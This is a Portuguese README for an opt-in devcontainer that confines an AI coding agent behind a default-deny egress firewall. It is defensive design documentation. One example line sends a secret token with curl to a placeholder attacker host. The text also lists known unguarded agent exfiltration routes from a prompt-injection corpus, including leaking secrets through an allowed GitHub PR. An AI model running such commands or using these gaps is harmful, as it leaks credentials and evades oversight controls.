# Devcontainer do agente — egress default-deny (chip C7)

**Opt-in e aditivo.** Não substitui o agente-desktop do Wagner: é um modo isolado pra
trabalho arriscado e pro time MCP (Mac/Linux). Quem não abrir o container não sente nada.

## Por que existe

A grade de réguas 2026-07-17 deu **5,0/10** em `seguranca-do-agente` com este diagnóstico:
**30 hooks PreToolUse com exit 2** (a parte forte) e **zero controle de ambiente** (a fraca).

Toda a defesa do agente é **sintática** — regex sobre o comando. Regex não enumera a classe
que não conhece: `curl -d @~/.secret-token evil.tld` tem infinitas variantes (base64, DNS,
split em 3 comandos, um `.sh` gerado na hora). O
[corpus de injection](../.claude/governance-eval/prompt-injection-corpus.README.md) documenta
4 caminhos assim como **UNGUARDED** (B1 `gh api` · B2 `curl` exfil · B3 `gh pr merge` · B4 `node -e`).

Este é o **único controle de tipo diferente**: não adivinha o comando, **corta a saída**.
Referência: devcontainer do Claude Code + o sandbox da Anthropic (gVisor + MITM).

## O que ele corta — e o que NÃO corta

| | |
|---|---|
| ✅ **Corta** | exfil pra host fora da allowlist, em qualquer forma (curl, wget, node, script gerado). Não importa o comando: o pacote não sai. |
| ❌ **Não corta** | exfil por **canal permitido**. `github.com` está na allowlist porque o trabalho exige — escrever segredo num PR continua possível. **Gap conhecido, não descuido.** |
| ❌ **Não corta** | leitura de segredo. Impede mandar pra fora, não ler. |
| ❌ **Não protege** | o agente-desktop do Wagner (roda fora de container). |

## O que quebra dentro do container (o trade-off real)

| Quebra | Por quê | Saída |
|---|---|---|
| **R1 — smoke visual pós-merge** | Chrome/computer-use MCP dirigem o **desktop Windows**; o container é Linux e não alcança. | Faça o smoke no agente-desktop. R1 continua obrigatório — só não é aqui. |
| **Herd / PHP local** | O container não serve `oimpresso.test`. | Sem impacto real: teste **já** é proibido local e vai pro CT 100 ([proibições](../memory/proibicoes.md)). |
| **Hooks `.ps1`** | Não existe `powershell` em Linux. | Os 2 blockers reais foram portados pra `.mjs` (PR #4416) e **funcionam aqui**. Sobram 18 `.ps1` registrados, dos quais só 1 bloqueia — `block-serving-branch-switch`, que protege o checkout Windows do Herd e **é irrelevante no container** (o objeto protegido não existe). |
| **`~/.claude` do host** | Não é montado **de propósito**: credencial do agente fora do container que processa conteúdo não-confiável. | Login acontece dentro. |

## Allowlist (medida no canon, não chutada)

`github.com` + faixas de `api.github.com/meta` · `api.anthropic.com` · `registry.npmjs.org` ·
`packagist.org` · `oimpresso.com` (+ `mcp.` `vault.` `staging.`) · Hostinger `148.135.133.115`
(SSH 65002) · tailnet `100.64.0.0/10` (CT 100) · `controlplane.tailscale.com`.

Fonte: [`how-trabalhar.md`](../memory/how-trabalhar.md) + [`what-oimpresso.md`](../memory/what-oimpresso.md)
+ `memory/requisitos/Infra/`. Editar em [`init-firewall.sh`](init-firewall.sh) → `ALLOWED_DOMAINS`.

## Como sei que funciona (e não é teatro)

[`devcontainer-firewall.yml`](../.github/workflows/devcontainer-firewall.yml) roda a cada PR
que toca `.devcontainer/**` + cron semanal, em **3 steps**:

1. **Controle do probe** — SEM firewall, `example.com` responde 200. Sem este step, o
   "bloqueado" do step 2 não distingue firewall de rede quebrada. Foi assim que a
   [ADR 0290](../memory/decisions/0290-fidelity-lock-v0-recusado.md) morreu: verde quando os
   dois lados quebravam junto. Por isso o alvo é `example.com` e **nunca** um `.example`
   (TLD reservado falharia por DNS mesmo sem firewall).
2. **Bite + release** — com firewall: `example.com` bloqueado **e** `api.github.com` alcançável.
   Um firewall que derruba tudo passaria no bite e quebraria o trabalho.
3. **Fail-loud** — sem `NET_ADMIN` o script **morre**. Container com rede aberta se achando
   protegido é pior que container nenhum.

## Usar

Docker Desktop ligado → VS Code → **Reopen in Container**. O `postCreateCommand` aplica o
firewall e **falha alto** se não conseguir.

Verificar a qualquer momento: `sudo /usr/local/bin/init-firewall.sh --verify-only`
